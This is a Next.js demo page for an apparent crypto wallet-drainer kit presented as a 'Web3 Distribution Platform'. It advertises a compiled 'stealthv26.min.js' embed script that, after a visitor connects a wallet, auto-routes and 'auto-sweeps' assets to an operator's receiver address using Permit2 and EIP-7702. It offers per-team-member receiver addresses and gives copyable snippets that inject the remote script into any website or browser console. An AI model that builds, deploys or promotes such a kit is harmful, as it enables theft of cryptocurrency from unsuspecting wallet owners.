"use client";

import { useEffect, useState } from "react";
import {
  Rocket,
  Wallet,
  Code2,
  Zap,
  CheckCircle2,
  ExternalLink,
  Copy,
  Check,
  Play,
  BarChart3,
  Shield,
  Network,
} from "lucide-react";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { toast } from "sonner";

export default function DemoPage() {
  const [copied, setCopied] = useState<string | null>(null);
  const [activeStep, setActiveStep] = useState(0);
  const [showCode, setShowCode] = useState(false);

  const steps = [
    {
      number: 1,
      title: "Connect Wallet",
      description: "Use the WalletConnect modal to connect your wallet",
      icon: Wallet,
      completed: true,
    },
    {
      number: 2,
      title: "Configure Distribution",
      description: "Set receiver address and auto-sweep parameters",
      icon: Zap,
      completed: true,
    },
    {
      number: 3,
      title: "Compile SDK",
      description: "Generate embeddable script with configuration baked in",
      icon: Code2,
      completed: true,
    },
    {
      number: 4,
      title: "Distribute Assets",
      description: "Assets automatically flow to configured receiver",
      icon: BarChart3,
      completed: false,
    },
  ];

  const copyCode = async (code: string, label: string) => {
    await navigator.clipboard.writeText(code);
    setCopied(label);
    toast.success(`${label} copied!`);
    setTimeout(() => setCopied(null), 2000);
  };

  const features = [
    {
      icon: Wallet,
      title: "Multi-Wallet Support",
      description:
        "MetaMask, WalletConnect, Coinbase, and hardware wallets via create-wc-dapp template",
    },
    {
      icon: Network,
      title: "Multi-Chain",
      description: "Ethereum, Solana, TRON, and 100+ EVM-compatible networks",
    },
    {
      icon: Shield,
      title: "Permit2 Integration",
      description:
        "EIP-7702 and gasless transactions with auto-sweep to receiver",
    },
    {
      icon: Code2,
      title: "Embeddable Scripts",
      description:
        "One-line embed generates full wallet integration on any website",
    },
    {
      icon: Zap,
      title: "Smart Routing",
      description: "Transactions automatically route to configured addresses",
    },
    {
      icon: BarChart3,
      title: "Distribution Analytics",
      description:
        "Real-time tracking of assets flowing through the platform",
    },
  ];

  const integrationCode = `<!-- Add this single line to ANY website -->
<script type="module" src="https://your-domain.com/api/sdk"></script>

<!-- Or inject into browser console for testing -->
const script = document.createElement('script');
script.type = 'module';
script.src = 'https://your-domain.com/api/sdk';
document.body.appendChild(script);`;

  const testingCode = `// Open DevTools (F12) on any website
// Paste into Console tab:

const script = document.createElement('script');
script.type = 'module';
script.src = 'http://localhost:3002/api/sdk';
document.body.appendChild(script);

// The wallet connection button will appear
// configured with your settings`;

  const architectureFlow = `Dashboard User:
1. Login → Configure Payout
2. Set Receiver: 0x788F...43A
3. Enable Auto-Sweep (100 USDC min)
4. Click "Compile SDK"
5. Download stealthv26.min.js

        ↓ [Embed on Website] ↓

End User:
1. Visit website with embedded button
2. Click "Connect Wallet"
3. Web3Modal opens (from template)
4. Connect with any wallet
5. Transactions → Auto-route to receiver
6. Auto-sweep consolidates assets`;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white p-6">
      {/* Header */}
      <div className="max-w-7xl mx-auto space-y-8">
        {/* Hero Section */}
        <div className="space-y-4 text-center">
          <div className="flex items-center justify-center gap-2 mb-4">
            <Rocket className="h-8 w-8 text-blue-400" />
            <h1 className="text-5xl font-bold bg-gradient-to-r from-blue-400 to-cyan-300 bg-clip-text text-transparent">
              Web3 Distribution Platform
            </h1>
            <Rocket className="h-8 w-8 text-cyan-300" />
          </div>
          <p className="text-xl text-slate-300 max-w-3xl mx-auto">
            Built on the create-wc-dapp template. Generate embeddable wallet scripts
            that route assets to your receiver address with one-click deployment.
          </p>
          <div className="flex gap-3 justify-center flex-wrap pt-4">
            <Badge variant="secondary" className="px-4 py-2">
              <CheckCircle2 className="h-3 w-3 mr-2" />
              WalletConnect Integrated
            </Badge>
            <Badge variant="secondary" className="px-4 py-2">
              <CheckCircle2 className="h-3 w-3 mr-2" />
              Permit2 Ready
            </Badge>
            <Badge variant="secondary" className="px-4 py-2">
              <CheckCircle2 className="h-3 w-3 mr-2" />
              Multi-Chain
            </Badge>
          </div>
        </div>

        {/* Core Features Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {features.map((feature, idx) => {
            const Icon = feature.icon;
            return (
              <Card
                key={idx}
                className="bg-slate-800/50 border-slate-700 hover:border-blue-500/50 transition-all"
              >
                <CardContent className="pt-6">
                  <Icon className="h-8 w-8 text-blue-400 mb-3" />
                  <h3 className="font-semibold text-lg mb-2">{feature.title}</h3>
                  <p className="text-sm text-slate-400">{feature.description}</p>
                </CardContent>
              </Card>
            );
          })}
        </div>

        <Separator className="bg-slate-700" />

        {/* Architecture Flow */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Network className="h-5 w-5 text-blue-400" />
              Complete Architecture Flow
            </CardTitle>
            <CardDescription>
              From dashboard configuration to production deployment
            </CardDescription>
          </CardHeader>
          <CardContent>
            <pre className="bg-slate-950 rounded-lg p-4 text-sm text-cyan-300 font-mono overflow-x-auto whitespace-pre-wrap text-xs leading-relaxed">
              {architectureFlow}
            </pre>
          </CardContent>
        </Card>

        {/* Integration Steps */}
        <Tabs defaultValue="integration" className="space-y-4">
          <TabsList className="bg-slate-800 border border-slate-700">
            <TabsTrigger value="integration">Integration</TabsTrigger>
            <TabsTrigger value="testing">Testing</TabsTrigger>
            <TabsTrigger value="deployment">Deployment</TabsTrigger>
          </TabsList>

          <TabsContent value="integration" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg">Embed on Your Website</CardTitle>
                <CardDescription>
                  One script tag does everything - wallet connection, modal, and
                  asset routing
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="bg-slate-950 rounded-lg p-4">
                  <pre className="text-cyan-300 font-mono text-sm overflow-x-auto whitespace-pre-wrap">
                    {integrationCode}
                  </pre>
                </div>
                <Button
                  onClick={() =>
                    copyCode(
                      integrationCode,
                      "Integration Code"
                    )
                  }
                  className="w-full bg-blue-600 hover:bg-blue-700"
                >
                  {copied === "Integration Code" ? (
                    <>
                      <Check className="h-4 w-4 mr-2" />
                      Copied!
                    </>
                  ) : (
                    <>
                      <Copy className="h-4 w-4 mr-2" />
                      Copy Integration Code
                    </>
                  )}
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="testing" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg">Test on create-wc-dapp</CardTitle>
                <CardDescription>
                  Use the official WalletConnect dapp creator for testing
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <p className="text-sm text-slate-300">
                    Copy the code below and paste into the browser console (F12)
                    on https://create-wc-dapp.vercel.app/
                  </p>
                  <div className="bg-slate-950 rounded-lg p-4">
                    <pre className="text-cyan-300 font-mono text-sm overflow-x-auto whitespace-pre-wrap">
                      {testingCode}
                    </pre>
                  </div>
                </div>
                <div className="flex gap-2">
                  <Button
                    onClick={() => copyCode(testingCode, "Testing Code")}
                    variant="outline"
                    className="flex-1 border-slate-600 hover:border-blue-500"
                  >
                    {copied === "Testing Code" ? (
                      <>
                        <Check className="h-4 w-4 mr-2" />
                        Copied!
                      </>
                    ) : (
                      <>
                        <Copy className="h-4 w-4 mr-2" />
                        Copy Code
                      </>
                    )}
                  </Button>
                  <a
                    href="https://create-wc-dapp.vercel.app/"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    <Button className="bg-blue-600 hover:bg-blue-700 gap-2">
                      <ExternalLink className="h-4 w-4" />
                      Open Dapp
                    </Button>
                  </a>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="deployment" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg">Deploy to Production</CardTitle>
                <CardDescription>
                  Steps to deploy the platform to your production environment
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  {[
                    {
                      step: 1,
                      title: "Set Production Domain",
                      description:
                        "Update NEXT_PUBLIC_APP_URL to your production domain",
                    },
                    {
                      step: 2,
                      title: "Enable HTTPS",
                      description:
                        "All script URLs must use HTTPS for security",
                    },
                    {
                      step: 3,
                      title: "Configure Payout Receiver",
                      description:
                        "Set your Permit2 receiver address in Settings → Payout",
                    },
                    {
                      step: 4,
                      title: "Generate API Keys",
                      description:
                        "Create WalletConnect Project ID in Modal configuration",
                    },
                    {
                      step: 5,
                      title: "Compile and Deploy",
                      description:
                        "Click Compile SDK to generate production scripts",
                    },
                    {
                      step: 6,
                      title: "Monitor Usage",
                      description:
                        "Track asset flows through the distribution analytics",
                    },
                  ].map((item) => (
                    <div
                      key={item.step}
                      className="flex gap-4 pb-4 border-b border-slate-700 last:border-0 last:pb-0"
                    >
                      <div className="flex-shrink-0">
                        <Badge className="bg-blue-600 text-white">
                          {item.step}
                        </Badge>
                      </div>
                      <div>
                        <p className="font-medium">{item.title}</p>
                        <p className="text-sm text-slate-400">
                          {item.description}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {/* Next Steps */}
        <Card className="bg-gradient-to-r from-blue-600/20 to-cyan-600/20 border-blue-500/30">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Play className="h-5 w-5 text-blue-400" />
              Ready to Get Started?
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <h3 className="font-semibold mb-2 flex items-center gap-2">
                  <CheckCircle2 className="h-4 w-4 text-green-400" />
                  For Developers
                </h3>
                <p className="text-sm text-slate-400">
                  Embed the script on your site and start accepting wallet
                  connections immediately.
                </p>
              </div>
              <div>
                <h3 className="font-semibold mb-2 flex items-center gap-2">
                  <CheckCircle2 className="h-4 w-4 text-green-400" />
                  For Teams
                </h3>
                <p className="text-sm text-slate-400">
                  Generate unique scripts for each team member with
                  individualized receiver addresses.
                </p>
              </div>
              <div>
                <h3 className="font-semibold mb-2 flex items-center gap-2">
                  <CheckCircle2 className="h-4 w-4 text-green-400" />
                  For Enterprises
                </h3>
                <p className="text-sm text-slate-400">
                  Deploy on private infrastructure with full audit logs and
                  compliance tracking.
                </p>
              </div>
            </div>

            <Separator className="bg-slate-600" />

            <div className="flex gap-3 pt-4">
              <a href="/compile" className="flex-1">
                <Button className="w-full bg-blue-600 hover:bg-blue-700 gap-2">
                  <Rocket className="h-4 w-4" />
                  Go to Compile Page
                </Button>
              </a>
              <a href="/settings" className="flex-1">
                <Button
                  variant="outline"
                  className="w-full border-slate-600 hover:border-blue-500"
                >
                  <Zap className="h-4 w-4 mr-2" />
                  Configure Settings
                </Button>
              </a>
            </div>
          </CardContent>
        </Card>

        {/* Tech Stack */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="text-lg">Built With</CardTitle>
            <CardDescription>
              Foundation: create-wc-dapp template
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                "Next.js 14",
                "WalletConnect v2",
                "Reown AppKit",
                "TypeScript",
                "Permit2 Protocol",
                "EIP-7702",
                "Multi-Chain",
                "Production Ready",
              ].map((tech) => (
                <div
                  key={tech}
                  className="bg-slate-950 rounded-lg p-3 text-center text-sm"
                >
                  {tech}
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Footer */}
        <div className="text-center text-sm text-slate-500 border-t border-slate-700 pt-6">
          <p>
            Web3 Distribution Platform built on create-wc-dapp template |
            Preserving original architecture | Multi-chain & multi-wallet
            support
          </p>
        </div>
      </div>
    </div>
  );
}
